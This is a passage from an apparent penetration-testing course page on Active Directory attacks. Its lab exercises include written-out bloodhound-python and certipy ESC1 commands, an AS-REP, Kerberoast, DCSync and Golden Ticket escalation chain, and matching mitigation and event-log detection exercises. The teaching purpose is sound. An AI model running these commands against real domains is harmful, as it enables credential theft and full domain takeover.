+<p>Moving between on-prem AD and Entra (hybrid) is a separate advanced pentest. Look up Specterops blog "Death from Above", "Adversary in the Middle".</p>
+<h2 id="exercises">Exercises</h2>
+<h3 id="exercise-131-home-ad-lab">Exercise 13.1 — Home AD lab</h3>
+<p>Minimum setup:
+- Windows Server 2019/2022 → install AD DS, create <code>example.local</code>.
+- Windows 10/11 client → join domain.
+- 5-10 fake users with various passwords (some weak, some with SPNs).
+- Disable SMB signing on a host. Configure LLMNR enabled.</p>
+<p>Free templating: <strong>GOAD</strong> (Game of Active Directory by M4yfly) — <code>git clone https://github.com/Orange-Cyberdefense/GOAD</code>.</p>
+<h3 id="exercise-132-bloodhound-walkthrough">Exercise 13.2 — BloodHound walkthrough</h3>
+<p>On your lab:</p>
+<pre><code class="language-bash">bloodhound-python -d example.local -u alice -p Password1 -c all -ns 10.10.10.1
+</code></pre>
+<p>Import into BloodHound. Run queries:
+- "Find Shortest Paths to Domain Admins".
+- "Find AS-REP Roastable Users".
+- "Find Kerberoastable Users".
+- "Find principals with Path to High Value Targets".</p>
+<h3 id="exercise-133-as-rep-kerberoast-dcsync-chain">Exercise 13.3 — AS-REP → Kerberoast → DCSync chain</h3>
+<ol>
+<li>Identify AS-REProastable users, crack a password.</li>
+<li>With that, GetUserSPNs → Kerberoast.</li>
+<li>Crack a service account.</li>
+<li>Check with BloodHound whether that account has DS-Replication privileges.</li>
+<li>If yes → secretsdump → krbtgt hash.</li>
+<li>Golden Ticket → Administrator.</li>
+</ol>
+<h3 id="exercise-134-certipy-esc1">Exercise 13.4 — Certipy ESC1</h3>
+<p>On a lab with ADCS:</p>
+<pre><code class="language-bash">certipy find -u alice@example.local -p Password1 -dc-ip 10.10.10.1 -vulnerable -stdout
+# find &quot;Vuln-Template&quot; ESC1
+certipy req -u alice -p Password1 -ca example-CA -template Vuln-Template -upn administrator@example.local
+certipy auth -pfx administrator.pfx
+</code></pre>
+<p>What are you demonstrating? Which key comes out at the end? What can you do with it?</p>
+<h3 id="exercise-135-tryhackme-hackthebox">Exercise 13.5 — TryHackMe / HackTheBox</h3>
+<ul>
+<li>TryHackMe: <strong>"Attacktive Directory"</strong>, <strong>"Holo"</strong>.</li>
+<li>HackTheBox: AD machines like <strong>Active</strong>, <strong>Forest</strong>, <strong>Resolute</strong>, <strong>Cascade</strong>, <strong>Sauna</strong>, <strong>Monteverde</strong>, <strong>Mantis</strong> (old but educational), <strong>Object</strong>, <strong>Authority</strong> (more modern).</li>
+</ul>
+<h3 id="exercise-136-mitigation-walkthrough">Exercise 13.6 — Mitigation walkthrough</h3>
+<p>On a host: disable LLMNR via GPO. Enable SMB signing required. Update LAPS. Verify with Responder that it now receives nothing.</p>
+<h3 id="exercise-137-detection">Exercise 13.7 — Detection</h3>
+<p>Run an AS-REP Roast and a Kerberoast in your lab. Look at Event Viewer / Sysmon on the DC:
+- Event ID 4768 (TGT requested).
+- Event ID 4769 (TGS requested).
+- AAD: what does MDI tell you?</p>
+<p>Which fields indicate "suspicious behavior"? Volume of TGS requests with RC4 encryption? "Don't require preauth" flagged?</p>
+<h2 id="key-concepts">Key concepts</h2>
+<ol>
+<li><strong>Kerberos</strong>: TGT, TGS, SPN.</li>
+<li><strong>AS-REP Roast</strong> and <strong>Kerberoast</strong> can be done with a basic domain user.</li>
+<li><strong>DCSync</strong> requires specific privileges → BloodHound finds them.</li>
+<li><strong>NTLM legacy + relay</strong> = still a very current problem.</li>
+<li><strong>ADCS ESC1-15</strong> are often the most direct path to Domain Admin.</li>
+<li><strong>mimikatz + LSASS</strong> vs Credential Guard / EDR.</li>
+<li><strong>gMSA, LAPS, Tier model, EPA, LDAP/SMB signing</strong> = pillars of AD defense.</li>
+</ol>
+<p>Now I take you into the world of binaries: exploit dev, reverse, malware.</p>
+      <nav class="pager">
+<a href="12-network-attacks.html" class="prev"><span class="label">← Previous</span><span class="title">Network attacks: MITM, spoofing, pivoting</span></a>
+<a href="14-exploit-development.html" class="next"><span class="label">Next →</span><span class="title">Exploit development: from buffer overflow to ROP</span></a>
+</nav>
+      <footer class="page-footer">
+        <p><strong>Cybersec Zero to Hero</strong> — built as a continuous path. Static build from Markdown.</p><p>Educational material. Everything you learn here is to be used only on systems you own, in labs, in authorized bug-bounty programs, or under signed pentest contracts. <strong>Don't break the law.</strong></p>
+      </footer>
+    </div>
+  </main>
+</div>
+<script src="../search-data.js"></script>
+<script src="../../search.js"></script>
+<script src="../../toc.js"></script>
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+  mermaid.initialize({
+    startOnLoad: true,
+    theme: 'base',
+    themeVariables: {
+      darkMode: true, background: '#131a1e', primaryColor: '#1d262b',
+      primaryTextColor: '#e8eef0', primaryBorderColor: '#00ff9c',
+      lineColor: '#00e6ff', secondaryColor: '#11171a', tertiaryColor: '#161d21',
+      mainBkg: '#1d262b', nodeBorder: '#00ff9c', clusterBkg: '#0b0f10',
+      clusterBorder: '#243035', titleColor: '#00ff9c',
+      edgeLabelBackground: '#0b0f10', textColor: '#e8eef0',
+      labelTextColor: '#e8eef0', actorBkg: '#1d262b', actorBorder: '#00ff9c',
+      actorTextColor: '#00ff9c', actorLineColor: '#00e6ff',
+      signalColor: '#e8eef0', signalTextColor: '#e8eef0',
+      labelBoxBkgColor: '#1d262b', labelBoxBorderColor: '#00ff9c',
+      noteBkgColor: '#ffe066', noteTextColor: '#0b0f10', noteBorderColor: '#ffe066',
+      activationBkgColor: '#1d262b', activationBorderColor: '#00ff9c',
+      sequenceNumberColor: '#0b0f10'
+    },
+    flowchart: { curve: 'basis', padding: 16 },
+    sequence: { mirrorActors: false, bottomMarginAdj: 10 },
+    fontFamily: 'JetBrains Mono, Cascadia Code, Consolas, monospace'
+  });
+</script>
+</body>
+</html>
